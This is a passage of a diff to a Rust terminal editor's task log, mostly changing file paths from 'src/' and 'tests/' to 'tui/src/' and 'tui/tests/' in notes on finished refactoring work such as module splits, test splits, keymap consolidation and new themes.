   `ui.rs` so its many existing bare call sites (`draw_contacts(app,
   frame, area)`, …) needed zero changes. Full workspace `cargo test`
-  green, snapshot tests (`tests/snapshots.rs`, 12/12) re-verified
+  green, snapshot tests (`tui/tests/snapshots.rs`, 12/12) re-verified
   directly since a rendering-path change deserves that scrutiny beyond
   the aggregate pass count. Pattern validated end-to-end.
   **Slice 2 (picker panels) done 2026-09-06.** Moved `draw_nerd_palette`
   and `draw_ascii_panel` (one contiguous pair) plus `draw_qrcode`,
   `draw_x11_panel`, and `draw_media_type_panel` (a second contiguous
   trio elsewhere in the file) — 5 functions across two non-contiguous
-  ranges, bundled into one `src/ui/picker_panels.rs` for symmetry with
-  the app-side `src/app/picker_panels.rs` state module from T141 slice
+  ranges, bundled into one `tui/src/ui/picker_panels.rs` for symmetry with
+  the app-side `tui/src/app/picker_panels.rs` state module from T141 slice
   11. Needed `use super::{NERD_CELL_W, draw_scrollbar, trunc};` plus the
   same `App`/`theme`/ratatui imports as slice 1. Functions made
   `pub(super)`; `ui.rs` gets `mod picker_panels; use picker_panels::{...};`,
@@ -1930,7 +1930,7 @@ and its own gate run, zero intended behavior change unless stated.
   `db_result_rows` (21 functions: connections list, add/edit form,
   password/save/ask/params prompts, cell/log/ERD/export views, and the
   three-pane workbench itself — schema tree, SQL editor with
-  autocomplete popup, results grid) — into `src/ui/db.rs`, all fully
+  autocomplete popup, results grid) — into `tui/src/ui/db.rs`, all fully
   contiguous in the original file. Only `draw_db` is called from
   `ui.rs` itself, so only it got `pub(super)`; the other 20 functions
   are used solely within the new module and stayed private — a
@@ -1952,7 +1952,7 @@ and its own gate run, zero intended behavior change unless stated.
   `draw_edit_sql`/`draw_edit_outline`, `value_line` plus
   `draw_edit_value`, `bytes_line` plus `draw_edit_bytes`,
   `draw_html_panel`, and `draw_outline` (21 functions, fully
-  contiguous) — into `src/ui/edit_surfaces.rs`: the CSV/TSV table
+  contiguous) — into `tui/src/ui/edit_surfaces.rs`: the CSV/TSV table
   editor, Org Column View, SQL snippet library, prose outline editor,
   structured-value (JSON/YAML) editor, byte (hex) editor, HTML
   character picker, and the document-outline panel. First pass missed
@@ -1973,7 +1973,7 @@ and its own gate run, zero intended behavior change unless stated.
   location/capture/refile list choosers (all built on the shared
   `draw_list_chooser`), the diff viewer, the Git status panel, the
   right-click context menu, and the spell-check suggestion popup —
-  into `src/ui/choosers.rs`. 14 of the 15 have exactly one other call
+  into `tui/src/ui/choosers.rs`. 14 of the 15 have exactly one other call
   site (`draw_overlays_aux`/`draw_chooser_overlays`) and got
   `pub(super)`; `draw_list_chooser` is used only by 9 siblings within
   the new module and stayed private. Two shared helpers
@@ -1988,7 +1988,7 @@ and its own gate run, zero intended behavior change unless stated.
   **Slice 6 (menu bar) done 2026-09-06.** Moved 8 functions —
   `draw_menu_bar`, `item_right`, `dropdown_width`, `render_dropdown`,
   `draw_menu_dropdown`, `menu_row_y`, `menu_tooltip_target`,
-  `draw_menu_tooltip` — into `src/ui/menu_bar.rs`: the top menu bar, up
+  `draw_menu_tooltip` — into `tui/src/ui/menu_bar.rs`: the top menu bar, up
   to three nested dropdown levels, and the help tooltip. A genuinely
   new case: `dock_toggle_cols`/`menu_dropdown_rect`/`dropdown_scroll`
   sit in the same source range but stayed in `ui.rs` — `App`'s
@@ -2006,11 +2006,11 @@ and its own gate run, zero intended behavior change unless stated.
   12/12 re-verified directly (including `file_menu_open`, the case
   this slice touches); full `scripts/check` clean.
   **Slice 7 (dialogs + file browser) done 2026-09-07.** Two thematically
-  distinct modules from one contiguous source range: `src/ui/dialogs.rs`
+  distinct modules from one contiguous source range: `tui/src/ui/dialogs.rs`
   (6 small modal dialogs — `draw_confirm`, `draw_script_trust`,
   `draw_replace_confirm`, `draw_unsaved`, `draw_paste_conflict`,
   `draw_query_replace`, all self-contained, all `pub(super)`) and
-  `src/ui/file_browser.rs` (the File → Open… overlay —
+  `tui/src/ui/file_browser.rs` (the File → Open… overlay —
   `draw_file_browser` `pub(super)` plus 3 private helpers, needing
   `use super::{draw_scrollbar, trunc, unix_secs_label};`). Confirmed
   before extracting that `dock_toggle_cols`/`menu_dropdown_rect`/
@@ -2024,7 +2024,7 @@ and its own gate run, zero intended behavior change unless stated.
   functions — `draw_ai_diff` (one of the workspace's 3
   `too_many_lines` allows), its `seg_line_count` helper, `vt_color`
   (`vt100::Color` → `ratatui::Color`), `draw_terminal` (also
-  `too_many_lines`), `draw_ai_panel` — into `src/ui/ai_terminal.rs`:
+  `too_many_lines`), `draw_ai_panel` — into `tui/src/ui/ai_terminal.rs`:
   the reviewable AI-diff hunk viewer, the PTY-backed terminal panel,
   and the persistent AI chat panel. Fully self-contained, no shared-
   helper dependency (confirmed `month_lines`/`centered`, sitting right
@@ -2035,10 +2035,10 @@ and its own gate run, zero intended behavior change unless stated.
   re-verified directly; full `scripts/check` clean.
   **Slice 9 (search + help) done 2026-09-07 — the largest T142 slice,
   effectively the whole rest of the file after slice 8's boundary.**
-  Two modules: `src/ui/search.rs` (`draw_palette`,
+  Two modules: `tui/src/ui/search.rs` (`draw_palette`,
   `draw_workspace_search`, `button_row`, `draw_search`
   [`too_many_lines`], `draw_search_options`, `field_line`,
-  `draw_prompt_preview`, `draw_prompt`) and `src/ui/help.rs`
+  `draw_prompt_preview`, `draw_prompt`) and `tui/src/ui/help.rs`
   (`draw_help` [F1], `draw_keybinding_editor`,
   `keybinding_editor_row_line`). Both need `use super::centered;` (a
   generic overlay-centering helper used by 4 functions split across
@@ -2054,9 +2054,9 @@ and its own gate run, zero intended behavior change unless stated.
   this slice touches); full `scripts/check` clean. `ui.rs` now 2,582
   lines, down from 7,293 at T142's start.
   **Slice 10 (LSP popups + tool panels) done 2026-09-07.** Two
-  modules: `src/ui/lsp_popups.rs` (`cursor_screen_yx`, `draw_completion`,
+  modules: `tui/src/ui/lsp_popups.rs` (`cursor_screen_yx`, `draw_completion`,
   `draw_hover`, `draw_code_actions`, `draw_code_lens`, and the shared
-  `draw_chooser` they both render through) and `src/ui/tool_panels.rs`
+  `draw_chooser` they both render through) and `tui/src/ui/tool_panels.rs`
   (`draw_pomodoro`, `draw_welcome`, `draw_dialog`, `draw_color_converter`,
   `draw_regex_tester`, `draw_calculator`, `draw_unit_converter` — 7
   small standalone overlays, needing `use super::draw_scrollbar;`).
@@ -2073,10 +2073,10 @@ and its own gate run, zero intended behavior change unless stated.
   **Slice 11 (explorer + boxes) done 2026-09-07 — first slice into
   territory flagged as "not clean overlay-per-file anymore."** Two
   modules, both actually clean once surveyed carefully:
-  `src/ui/explorer.rs` (`explorer_rows` + `draw_explorer`, needing
+  `tui/src/ui/explorer.rs` (`explorer_rows` + `draw_explorer`, needing
   `use super::{draw_hscrollbar, draw_scrollbar, git_change_color,
   hslice_spans, span_line_width};` — `git_change_color` stays since
-  `choosers.rs` also needs it) and `src/ui/boxes.rs` (`draw_calendar`,
+  `choosers.rs` also needs it) and `tui/src/ui/boxes.rs` (`draw_calendar`,
   `draw_clock`, `draw_dashboard`, `month_lines` — zero shared-helper
   dependency; `CAL_PREV`/`CAL_NEXT`, `pub` but with no actual external
   referrer anywhere in the crate, moved with their sole user). Also
@@ -2091,9 +2091,9 @@ and its own gate run, zero intended behavior change unless stated.
   `scripts/check` clean. `ui.rs` now 1,535 lines, down from 7,293 at
   T142's start — a 79% cut.
   **Slice 12 (tabs + hints + docks) done 2026-09-07.** Three clean
-  clusters, all with sole callers in `draw()` itself: `src/ui/tabs.rs`
-  (`center_split`, `draw_breadcrumb`, `draw_tabs`), `src/ui/hints.rs`
-  (`draw_which_key`, `draw_jump_labels`), `src/ui/docks.rs`
+  clusters, all with sole callers in `draw()` itself: `tui/src/ui/tabs.rs`
+  (`center_split`, `draw_breadcrumb`, `draw_tabs`), `tui/src/ui/hints.rs`
+  (`draw_which_key`, `draw_jump_labels`), `tui/src/ui/docks.rs`
   (`draw_test_panel`, `draw_debug_panel`, `draw_outline_dock`,
   `draw_messages`, needing `use super::{draw_hscrollbar,
   draw_scrollbar, hslice_spans, span_line_width};` since
@@ -2109,12 +2109,12 @@ and its own gate run, zero intended behavior change unless stated.
   full `scripts/check` clean. `ui.rs` now 1,173 lines, down from 7,293
   at T142's start — an 84% cut.
   **Slice 13 (minimap + bottom_dock + status_bar) done 2026-09-08.**
-  Three more clean clusters: `src/ui/minimap.rs` (`draw_minimap`, sole
-  caller `draw_editor_region` staying in `ui.rs`), `src/ui/bottom_dock.rs`
+  Three more clean clusters: `tui/src/ui/minimap.rs` (`draw_minimap`, sole
+  caller `draw_editor_region` staying in `ui.rs`), `tui/src/ui/bottom_dock.rs`
   (`hslice`, `max_line_width`, `draw_bottom_dock` — confirmed the two
   helpers are used only by `draw_bottom_dock`, unlike
   `span_line_width`/`hslice_spans` which stayed since `explorer.rs`/
-  `docks.rs` also need them), `src/ui/status_bar.rs` (`draw_status_bar`,
+  `docks.rs` also need them), `tui/src/ui/status_bar.rs` (`draw_status_bar`,
   fully self-contained). One gotcha caught before it reached the
   compiler: the body referenced `super::editor::Tab::display_path` —
   in `ui.rs` that meant the crate root, but one level deeper it would
@@ -2129,7 +2129,7 @@ and its own gate run, zero intended behavior change unless stated.
   `ui.rs` now 958 lines, down from 7,293 at T142's start — an 87% cut.
   **Slice 14 (core editor region) done 2026-09-08 — the slice flagged
   as most likely where the pattern stops, surveyed carefully anyway
-  and it still held.** `src/ui/editor_region.rs`: `draw_editor_region`,
+  and it still held.** `tui/src/ui/editor_region.rs`: `draw_editor_region`,
   `draw_pane`, `tint_ruler`, `draw_center` — the actual core editor
   rendering (single pane or a split tree, one pane's text + scrollbar
   + ruler guide, the un-split "center" case with its optional minimap
@@ -2153,9 +2153,9 @@ and its own gate run, zero intended behavior change unless stated.
   rendering (including `editor_with_typed_rust_source` and
   `editor_with_an_opened_rust_file`); full `scripts/check` clean.
   `ui.rs` now 713 lines, down from 7,293 at T142's start — a 90% cut.
-- [x] **T143 — Split `tests/integration.rs`.** Done. The file had grown to
+- [x] **T143 — Split `tui/tests/integration.rs`.** Done. The file had grown to
   9,427 lines / 481 top-level items (462 `#[test]` fns + 19 shared helpers)
-  by the time this ran. Moved to `tests/integration/main.rs` (crate doc +
+  by the time this ran. Moved to `tui/tests/integration/main.rs` (crate doc +
   `#![warn(clippy::pedantic)]`/`#![allow(...)]` + `mod` list) plus
   `common.rs` (every non-`#[test]` item — `app_at`/`key`/`ctrl`/`type_str`/
   `buffer_with`/etc., made `pub(crate)` so `use crate::common::*;` resolves
@@ -2188,14 +2188,14 @@ and its own gate run, zero intended behavior change unless stated.
   test a distinct tag (`"edit-outline"`); reran the full suite 4× after,
   clean every time. Grepped every other `unique_dir` call for the same
   class of collision — none found. Updated every doc/spec that named
-  `tests/integration.rs` as a code-span path (`scripts/check-docs` checks
+  `tui/tests/integration.rs` as a code-span path (`scripts/check-docs` checks
   those, not just markdown links): `AGENTS.md`, `agents/workflow.md`,
   `spec/test/index.md` (also gained a short paragraph naming the new area
   files), `docs/architecture/index.md`, and the three crate specs whose
   own tests moved to a specific area file rather than the generic entry
   point (`vix-editor/spec/command-key`, `vix-editor-core/spec`,
-  `vix-clipboard/spec` → `tests/integration/editing.rs` ×2,
-  `tests/integration/catalog.rs`). No CHANGELOG entry: pure-internal,
+  `vix-clipboard/spec` → `tui/tests/integration/editing.rs` ×2,
+  `tui/tests/integration/catalog.rs`). No CHANGELOG entry: pure-internal,
   zero product behavior change, matching T150/T154 precedent.
 - [x] **T144 — One list-navigation state instead of eighteen.** Done.
   New `vix-list-state` crate: 6 pure functions (`up`, `down`,
@@ -2217,14 +2217,14 @@ and its own gate run, zero intended behavior change unless stated.
   `select_index` concept at all — a much smaller, weaker instance of
   the pattern, left alone rather than chased for scope's sake.
   `vix-git-panel` (the task's other named example) doesn't exist as a
-  crate at all; git's own navigation lives ad hoc in `src/app/git.rs`.
+  crate at all; git's own navigation lives ad hoc in `tui/src/app/git.rs`.
   A `ListCursor { selected, scroll }` struct (the task's own literal
   suggestion) was tried first and rejected: panel fields aren't
   uniformly named (`selected`/`sel`/`row`/`top`), several panels don't
   store a plain index at all (`vix-edit-bytes` derives a row from a
   byte cursor, `vix-edit-outline` derives a position from a computed
   visible-node list), and dozens of external call sites across
-  `src/app.rs`/`src/ui/*.rs` read a panel's `.selected`/`.scroll`
+  `tui/src/app.rs`/`tui/src/ui/*.rs` read a panel's `.selected`/`.scroll`
   fields directly — a shared struct would force renaming every panel's
   public fields for a purely internal deduplication. Plain functions
   over `usize`s fit every panel with zero public API change: every
@@ -2242,7 +2242,7 @@ and its own gate run, zero intended behavior change unless stated.
   merge" (one merge, one gate) while keeping "one commit per panel"
   for bisectable history.
 - [x] **T145 — Consolidate the T104 epic's own leftovers.** T104c–g each
-  added a near-identical key-token builder to `src/app.rs`:
+  added a near-identical key-token builder to `tui/src/app.rs`:
   `vscode_ctrl_token`, `intellij_ctrl_token`, `eclipse_token`,
   `sublime_ctrl_token`, `apple_ctrl_token` (plus `shared_token` and
   `emacs_top_level_token`, 7 total). They differ only in whether `Alt`
@@ -2309,10 +2309,10 @@ and its own gate run, zero intended behavior change unless stated.
   call, per the fix noted in T105's own entry — the fix worked. Zero
   intended behavior change everywhere except the one real bug found and
   fixed above: full 439-test suite green throughout (unchanged count —
-  one existing test extended, not a new one, plus 2 new `src/app.rs`
+  one existing test extended, not a new one, plus 2 new `tui/src/app.rs`
   unit tests for `modifier_token_display`'s Emacs-equivalence).
 - [x] **T146 — No silent keymap fallback.** Done. `Keymap::from_id`
-  (`src/app.rs`) now returns `Option<Keymap>` (`None` for an unrecognized
+  (`tui/src/app.rs`) now returns `Option<Keymap>` (`None` for an unrecognized
   id) instead of silently mapping it to `Keymap::Apple` — the exact defect
   that let an integration test pass for months while testing the wrong
   keymap (found in T104d: `"intellij-mac"` ≠ `"intellij-macos"`). The only
@@ -2338,7 +2338,7 @@ and its own gate run, zero intended behavior change unless stated.
   `App`'s private 9-variant `enum Keymap` in favor of the model's 10
   string ids everywhere" as a genuinely separate, larger follow-up, not
   done here — the task's own wording ("then *consider*") treats it as
-  optional, and it touches every keymap dispatch site in `src/app.rs`, not
+  optional, and it touches every keymap dispatch site in `tui/src/app.rs`, not
   a small fix.
 - [x] **T147 — A real action catalog.** Done. The command palette and
   `App::action_title` learn action titles only by walking
@@ -2359,7 +2359,7 @@ and its own gate run, zero intended behavior change unless stated.
   New `vix-action-catalog` crate (`Action { id, title }` + `CATALOG` +
   `title_key`), covering the **157** action ids titled nowhere else —
   found by walking the real 27-function `run_action` dispatch chain by
-  source (`tests/action_catalog.rs`, brace-balancing each dispatcher out
+  source (`tui/tests/action_catalog.rs`, brace-balancing each dispatcher out
   of its file) and diffing against both real title sources. A second,
   independent hand-curated catalog turned up mid-implementation:
   `palette::COMMANDS` (the palette's own `>` mode list, 154 entries) is
@@ -2384,7 +2384,7 @@ and its own gate run, zero intended behavior change unless stated.
   reusing vocabulary already established by existing `menu.item.*`/
   `help.*` keys (the actual translation content generated by 4 parallel
   subagents against a from-existing-content glossary, for cross-language
-  consistency at this volume). `tests/snapshots/
+  consistency at this volume). `tui/tests/snapshots/
   snapshots__f1_help_overlay.snap` updated deliberately for the richer,
   granular per-menu-item rows the shrunk `ROWS` now produces — verified
   by eye before accepting, not just re-recorded blindly. Crate count
@@ -2393,7 +2393,7 @@ and its own gate run, zero intended behavior change unless stated.
   parts. `locales/app.yml` is
   26,298 lines holding 2,240 keys, and 690 of them (31%) carry only
   `en` — every `msg.*` added since scripting landed, most menu items
-  from 2026-07 on. (a) Extend `tests/i18n_keys.rs` to print a per-locale
+  from 2026-07 on. (a) Extend `tui/tests/i18n_keys.rs` to print a per-locale
   coverage table and fail if any locale drops below its current floor
   (ratchet, never regress); (b) backfill the 690 — a good first job for
   the T124 AI provider with human review, or a per-locale contributor
@@ -2419,10 +2419,10 @@ and its own gate run, zero intended behavior change unless stated.
   multi-file merging is supported (`i18n!` already pointed at the
   `locales/` directory, not the file, so no macro-side change was
   needed) — verified empirically too: the app itself compiles clean
-  against the split. `tests/i18n_keys.rs` gained a shared `load_catalog`
+  against the split. `tui/tests/i18n_keys.rs` gained a shared `load_catalog`
   helper (merges every `locales/*.yml`, panics on a key defined in more
   than one file — a new failure mode the split makes possible that
-  didn't exist with one file); `tests/action_catalog.rs` got its own
+  didn't exist with one file); `tui/tests/action_catalog.rs` got its own
   smaller equivalent (a separate test binary, can't share the helper).
   `crates/vix-i18n/build.rs` rewritten to `rerun-if-changed` every file
   in `locales/`, not just the one that no longer exists — a directory's
@@ -2513,8 +2513,8 @@ and its own gate run, zero intended behavior change unless stated.
   block per struct with a named `const` per former bool field, a single
   `flags: Flags` field replacing them, reads via `.contains()`, writes
   via `.set()`/`.toggle()`/`.insert()`/`.remove()`. Every call site
-  across `src/app.rs`, `src/app/lsp_dap.rs`, `src/app/org_table.rs`,
-  `src/ui/search.rs`, and the integration/fuzz test suites was updated
+  across `tui/src/app.rs`, `tui/src/app/lsp_dap.rs`, `tui/src/app/org_table.rs`,
+  `tui/src/ui/search.rs`, and the integration/fuzz test suites was updated
   to match; full `scripts/check` gate green after each struct and again
   for the combined change. Where the bools are really one mode, an enum
   remains the right tool — none of the five converted structs needed
@@ -2530,7 +2530,7 @@ and its own gate run, zero intended behavior change unless stated.
   standalone round-trip test: flatten + old-format-missing-fields both
   work correctly with `toml`/`serde`) — but every `settings.<field>`
   read site still needs updating to `settings.<group>.<field>`, and
-  there are **~200+** of those across `src/`. `App` (19 bools) is a
+  there are **~200+** of those across `tui/src/`. `App` (19 bools) is a
   poorer fit for any single unifying scheme — its bools are
   semantically scattered (panel visibility, one-shot signals like
   `should_quit`, editor modes, workspace facts like `git_repo`), so
@@ -2564,7 +2564,7 @@ and its own gate run, zero intended behavior change unless stated.
   the persisted defaults), so a blind rename would have corrupted those;
   the compiler then found the 2 strays the prefix scope missed (locals
   holding a `Settings` directly). Two real knock-ons a mechanical pass
-  wouldn't predict: (1) `examples/list_commands.rs`'s settings-doc
+  wouldn't predict: (1) `tui/examples/list_commands.rs`'s settings-doc
   generator parsed `pub struct Settings { .. }`'s literal source text and
   would have emitted 11 bogus `gutter: GutterSettings` rows while
   dropping all 32 real keys — rewritten to parse every `pub struct` and
@@ -2575,7 +2575,7 @@ and its own gate run, zero intended behavior change unless stated.
   action ids from `docs/reference/actions.md` (661→653) because
   `vix_action_catalog::dispatch_scan::DISPATCHERS` is an explicit
   function list — caught only by the gate's regenerate-and-diff step, not
-  by `tests/action_catalog.rs` (whose assertions are "everything found
+  by `tui/tests/action_catalog.rs` (whose assertions are "everything found
   is titled", not "everything expected was found"); fixed by registering
   the new dispatcher.
   **`App` slice 1/N done 2026-09-18**: the 15 UI-surface-visibility
@@ -2622,8 +2622,8 @@ and its own gate run, zero intended behavior change unless stated.
   (`None`/`CtrlX`/`CtrlC`/`CtrlCCtrlX`/`CtrlCP`/`CtrlCPC`/`CtrlCPCM`) —
   at most one chord is ever pending at a time, so an enum is the
   correct shape where the first slice's bitset (independently
-  combinable toggles) wasn't. 39 call sites across `src/app.rs` and
-  `src/app/keymap.rs`. Found and fixed a real, previously-silent bug as
+  combinable toggles) wasn't. 39 call sites across `tui/src/app.rs` and
+  `tui/src/app/keymap.rs`. Found and fixed a real, previously-silent bug as
   a direct side effect of the consolidation: `reset_keymap_modes`
   (switching keymaps) used to clear only `emacs_prefix`
   (`self.emacs_prefix = false`), so a pending `C-c …`/`C-c p …` chord
@@ -2649,10 +2649,10 @@ and its own gate run, zero intended behavior change unless stated.
   modal engine resolves a pending `gg` before it could ever also have a
   pending register-select) become `modal_pending: ModalPending`
   (`None`/`G`/`RegisterSelect`, `#[derive(Default)]` on `None`). ~15
-  call sites across `src/app.rs` and `src/app/modal.rs`, done by hand
+  call sites across `tui/src/app.rs` and `tui/src/app/modal.rs`, done by hand
   (not the earlier slices' regex script, given the smaller scope and to
   avoid a repeat of slices 1/2's stray-token mangling) and verified
-  clean on the first `cargo check`. `tests/integration/editing.rs`'s
+  clean on the first `cargo check`. `tui/tests/integration/editing.rs`'s
   macro test updated to assert on `MacroState` variants directly.
   Pre-slice-3 the corrected count was 18 remaining bools (not 14, per
   the correction above); this slice removed 4 of them
@@ -2674,12 +2674,12 @@ and its own gate run, zero intended behavior change unless stated.
   exclusive modes. A single `pub flags: AppFlags` field replaces them
   all — several of the 14 (`clip_cut`, `overwrite`, `suspend_requested`,
   `git_repo`, `spellcheck`, `calendar_dailies`, `should_quit`) were
-  already `pub` (read from `src/main.rs`, `src/ui.rs`,
-  `src/ui/explorer.rs`, and the integration test suite), so the merged
+  already `pub` (read from `tui/src/main.rs`, `tui/src/ui.rs`,
+  `tui/src/ui/explorer.rs`, and the integration test suite), so the merged
   field is `pub` too, same tradeoff `Visible` already made in slice 1.
-  ~94 call sites across `src/app.rs` and 7 `src/app/*.rs` submodules,
-  `src/main.rs`, `src/lib.rs`'s own doctest, `src/ui.rs`,
-  `src/ui/explorer.rs`, and 5 `tests/integration/*.rs` files — mixed
+  ~94 call sites across `tui/src/app.rs` and 7 `tui/src/app/*.rs` submodules,
+  `tui/src/main.rs`, `tui/src/lib.rs`'s own doctest, `tui/src/ui.rs`,
+  `tui/src/ui/explorer.rs`, and 5 `tui/tests/integration/*.rs` files — mixed
   mechanical (Python find/replace, scoped per field name to avoid the
   `Settings`-vs-`App` `spellcheck`/`calendar_dailies` collision T149's
   Settings pass already found once) and by-hand fixes, clean on the
@@ -2714,12 +2714,12 @@ and its own gate run, zero intended behavior change unless stated.
   buffer). **4 new unit tests** in `multicursor.rs`'s own `caret_tests`
   module (`multi_insert`/`multi_delete`, both the bare-caret and
   selection-replace paths) — neither method had *any* test coverage
-  before this, in this crate or `tests/integration.rs` (the existing
+  before this, in this crate or `tui/tests/integration.rs` (the existing
   multi-caret tests only ever check that carets were added, never that
   typing/deleting with several active actually rewrites the buffer
   correctly at every one). The 5 pre-existing per-expression allows
   (3 `cast_precision_loss`, 2 `cast_possible_truncation`, in
-  `vix-file-browser-panel`/`vix-org-table`/`src/app.rs`) were swept and
+  `vix-file-browser-panel`/`vix-org-table`/`tui/src/app.rs`) were swept and
   found **already compliant** with the task's own "at worst" fallback —
   each already carries a one-line proof comment, and each is a
   `f64`-to-display-integer/size rounding where no `TryFrom` alternative
@@ -2729,7 +2729,7 @@ and its own gate run, zero intended behavior change unless stated.
 - [x] **T151 — Micro-crate audit.** Done. Added a "When to add a new
   crate" section to `AGENTS.md` (own spec, own tests — in-crate or, for
   a pure App-driven panel-state crate with no logic worth isolating,
-  thorough `tests/integration/*.rs` coverage — and a consumer other
+  thorough `tui/tests/integration/*.rs` coverage — and a consumer other
   than the App shell or a clear host-agnostic reuse story). Audited the
   four named 0-test crates against it: `vix-modal` stays as documented
   design scaffolding (explicitly out of scope per the task); `vix-i18n`
@@ -2738,8 +2738,8 @@ and its own gate run, zero intended behavior change unless stated.
   had a real gap — added 4 unit tests for `file_icon` (known
   extensions, fallback, case sensitivity, multi-dot names); `vix-query`
   (37 lines, a bare `Decision`/`QueryReplace` data holder with no
-  methods and no consumer beyond `src/app.rs`) failed on both counts
-  and was folded directly into `src/app.rs`, next to `Prompt` — same
+  methods and no consumer beyond `tui/src/app.rs`) failed on both counts
+  and was folded directly into `tui/src/app.rs`, next to `Prompt` — same
   precedent as `vix-projectile` → `vix-tasks`, just crate-into-shell
   instead of crate-into-crate since the App shell was always its only
   consumer. Crate count 111 → 110, bumped everywhere it's cited.
@@ -2772,21 +2772,21 @@ and its own gate run, zero intended behavior change unless stated.
   `SearchBar`/`WorkspaceSearch`/`editor_core Editor` from before T149
   converted them to `bitflags` and dropped the allow — corrected to
   `App`/`Settings` only. Full `scripts/check` gate green throughout.
-- [x] **T152 — Root `src/` modules that should be crates.** Done, 5
+- [x] **T152 — Root `tui/src/` modules that should be crates.** Done, 5
   slices, 2026-09-08. `column_view.rs` (966 lines), `edit_table.rs`
   (770), `edit_outline.rs`
   (610), `explorer.rs`, `search.rs`, `workspace_search.rs`, `messages.rs`
-  live in `src/` with no spec and outside `scripts/check-docs`'s
+  live in `tui/src/` with no spec and outside `scripts/check-docs`'s
   "every crate owns a spec" gate — the 2026-07 "crates, not modules"
   decision was applied everywhere except here. Move each to
-  `crates/vix-<name>` with a `spec/index.md`, one per branch; `src/`
+  `crates/vix-<name>` with a `spec/index.md`, one per branch; `tui/src/`
   should end up as `app.rs` (or `app/`, after T141), `ui.rs`, `lib.rs`,
   `main.rs`.
 
   Slice 1: `explorer.rs`/`search.rs`/`messages.rs` turned out to already
   be thin re-export shims (their real logic had moved to `vix-left-dock`/
   `vix-find-panel`/`vix-right-dock` in an earlier pass that never deleted
-  the now-redundant files) — `pub mod X;` in `src/lib.rs` became
+  the now-redundant files) — `pub mod X;` in `tui/src/lib.rs` became
   `pub use vix_Y as X;` (the same pattern already used for `calendar`/
   `clock`), files deleted, zero caller changes anywhere (same public
   paths). Slices 2-5 were genuine extractions — `workspace_search.rs`
@@ -2806,14 +2806,14 @@ and its own gate run, zero intended behavior change unless stated.
   `Consumed`/`Close`/`NeedsColumnPrompt` — no `Save` at all, since
   column-view edits are already live in the buffer by the time a key
   returns. `crate-map.md`'s "App shell" file table lost a row per
-  slice and gained a closing note once `src/` reached exactly
+  slice and gained a closing note once `tui/src/` reached exactly
   `main.rs`/`lib.rs`/`app.rs`/`ui.rs` — this task's own literal target,
   now true. Crate count 106→111 across the whole T147/T148/T152 run
   this session (108→111 for T152's own 4 new crates); each slice's
   crate-count bump swept every doc that cites it. Full `scripts/check`
   gate green on every slice, merged to `main`.
 - [x] **T153 — Sort the palette's Files mode.** Done. `palette_file_entries`
-  (`src/app.rs`) now scores every candidate with `palette::fuzzy_score` and
+  (`tui/src/app.rs`) now scores every candidate with `palette::fuzzy_score` and
   sorts by score descending, tie-broken on the path — the same
   `(score, tiebreak, Entry)` shape `recompute_palette`'s `PMode::Commands`
   arm already used. An empty query scores every candidate `0`
@@ -2829,7 +2829,7 @@ and its own gate run, zero intended behavior change unless stated.
   alphabetical order; empty query lists alphabetically) — Files mode had
   no test coverage at all before this. Leaves T004's originally-flagged
   "unblocks a Files-mode snapshot scenario" as a follow-up, not done here
-  (a `tests/snapshots.rs` scenario is its own small deliverable).
+  (a `tui/tests/snapshots.rs` scenario is its own small deliverable).
 - [x] **T154 — Keep `Cargo.toml` descriptions honest.** Done. New
   `scripts/check-docs` gate (`check_descriptions`): each crate's `description`
   (markup-stripped, trailing period trimmed) must be a literal prefix of the
@@ -2983,7 +2983,7 @@ and its own gate run, zero intended behavior change unless stated.
   get/set round trip and navigation. Crate count 111 → 112. Full
   `scripts/check` gate green.
 - [x] **T203 — New bundled themes.** Done. Solarized Dark, Solarized
-  Light, and Tokyo Night already existed in `themes/` (the task's own
+  Light, and Tokyo Night already existed in `tui/themes/` (the task's own
   text didn't know that); added `catppuccin-mocha.json` (the real
   published Catppuccin Mocha palette) and `high-contrast.json` (pure
   white on pure black, bright saturated syntax colors — every text
@@ -2991,17 +2991,17 @@ and its own gate run, zero intended behavior change unless stated.
   well past WCAG AA's 4.5:1 minimum; computed with the standard
   relative-luminance formula, not eyeballed).
   "Snapshot test each" turned out not to give the regression protection
-  the task's own wording implies: `tests/snapshots.rs`'s harness
+  the task's own wording implies: `tui/tests/snapshots.rs`'s harness
   flattens a rendered frame to **plain text** (`buf[(x,y)].symbol()`
   only) — it never reads `.style()`, so a color-only regression is
   invisible to it, and five near-identical text-only goldens (same
   glyphs, different pinned theme) would have added corpus size for no
   real coverage. Used two other layers instead: a new
-  `tests/integration/themes.rs` that parses each of the 5 themes'
+  `tui/tests/integration/themes.rs` that parses each of the 5 themes'
   JSON directly and asserts pinned RGB values per slot (the actual
   "so slots can't silently regress" goal), and one new
-  `tests/snapshots.rs` test that applies **every** bundled theme
-  (reading `themes/*.json` directly, not via `vix::menu::menus()` —
+  `tui/tests/snapshots.rs` test that applies **every** bundled theme
+  (reading `tui/themes/*.json` directly, not via `vix::menu::menus()` —
   that menu is built once and cached process-wide, so which themes its
   Theme submenu lists depends on test run order within the binary, not
   a reliable enumeration) and asserts the render doesn't panic and
@@ -3009,7 +3009,7 @@ and its own gate run, zero intended behavior change unless stated.
   theme, and it's the actual failure mode "so a malformed theme is
   caught" cares about.
   Found and fixed a real, unrelated bug while writing the name-
-  uniqueness test: `themes/safelight-red.json` (a red-on-black theme)
+  uniqueness test: `tui/themes/safelight-red.json` (a red-on-black theme)
   declared `"name": "Phosphor Amber"` — copy-paste from the *real*
   `phosphor-amber.json` — so the picker only ever offered one of the
   two. Also fixed `docs/themes/index.md`'s "Ready-made themes" list,
@@ -3143,8 +3143,8 @@ and its own gate run, zero intended behavior change unless stated.
   (reusing the existing `status.read_only_blocked` message, already used
   for edit-blocking) rather than a one-off for just these tabs.
 
-  9 new integration tests (5 in `tests/integration/workspace.rs`'s
-  sibling `tests/integration/git.rs`, `#[ignore]`d like every other test
+  9 new integration tests (5 in `tui/tests/integration/workspace.rs`'s
+  sibling `tui/tests/integration/git.rs`, `#[ignore]`d like every other test
   in that file needing a real throwaway repo — run manually with
   `--ignored` and verified passing, same as the file's pre-existing
   tests) plus 5 new `vix-git` unit tests (`parse_log`, `LogPanel`
@@ -3233,7 +3233,7 @@ and its own gate run, zero intended behavior change unless stated.
   git diff gutter uses for added/deleted/modified) — reused exactly as
   the task asked, no new rendering code in `vix-editor-core`. The
   coverage and git diff gutters share that one gutter-sign column, so
-  only one shows per buffer: `src/ui.rs`'s per-frame refresh calls
+  only one shows per buffer: `tui/src/ui.rs`'s per-frame refresh calls
   `refresh_coverage_gutter` instead of `refresh_git_gutter` while
   `App::coverage_gutter_active()` is true. **Tools → Toggle Coverage
